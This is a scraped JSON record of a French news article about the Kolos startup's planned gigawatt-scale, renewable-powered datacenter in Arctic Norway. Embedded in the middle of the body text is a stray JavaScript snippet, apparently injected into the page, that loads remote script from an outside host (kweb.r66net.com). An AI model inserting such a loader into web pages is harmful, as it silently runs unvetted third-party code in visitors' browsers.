{"title": "Le plus grand datacenter du monde sera construit en Arctique", "newspaper": "Futura Sciences", "author": ["Marc Zaffagni"], "date_publi": "2017-08-17", "content": "Le plus grand datacenter du monde sera construit dans la region arctique du nord de la Norvege. Il sera entierement alimente par des energies renouvelables hydroelectriques et eoliennes pour satisfaire une consommation totale qui atteindra un gigawatt. Le  refroidissement  des installations d'un centre de donnees (ou  datacenter ) represente un defi technique majeur. La consommation d'energie devolue a cette tache est en effet aussi importante que celle utilisee pour faire fonctionner l'installation elle-meme. L'une des solutions choisies par les operateurs de ces infrastructures est de les localiser dans des regions froides, notamment les pays nordiques, pour profiter de la temperature ambiante. Alors quel meilleur emplacement que le cercle polaire ? Kolos , une jeune pousse americano-norvegienne, va construire ce qui est presente comme le plus grand  datacenter  du monde a Ballangen, une petite ville situee au nord de la Norvege, au-dela du cercle  Arctique , par 68deg de  latitude . L'installation s'etalera sur 600.000 m 2  repartis dans quatre batiments construits au bord d'un lac. Une fois acheve, le site depassera en taille et en capacite le centre de donnees de Langfang (Chine) qui totalise 585.289 m 2 .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Le datacenter de Ballangen consommera jusqu'a 1 gigawatt D'ici dix ans, Kolos pense avoir installe assez de  serveurs  pour atteindre une consommation totale d'un gigawatt, ce qui represente a l'heure actuelle un record absolu. Pour satisfaire une telle demande, le datacenter sera alimente a 100 % par des  energies renouvelables  d'origine eolienne et hydroelectrique. Mais avant d'atteindre cet objectif, l'installation de Ballangen sera plus modeste, avec une consommation initiale de 70 megawatts. Toutefois, le record que veut s'octroyer Kolos risque de ne pas tenir tres longtemps. En effet, l'entreprise nord-americaine Switch est en train de construire un datacenter dans le Nevada (Etats-Unis) dont la surface totale frolera les 669.000 m 2 . Lui aussi alimente a 100 % par des  energies renouvelables , il ne consommera << que >> 650 megawatts. Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  plus grand zoo du monde  |  plus grand tenia du monde  |  iceberg plus grand du monde  |  plus grand carnivore du monde  |  plus grand araignee du monde  |  plus grand mathematicien du monde  |  plus grand seisme du monde  |  plus grand physicien du monde  |  plus grand oiseau du monde  |  27 aout mars sera visible", "theme": "tech"}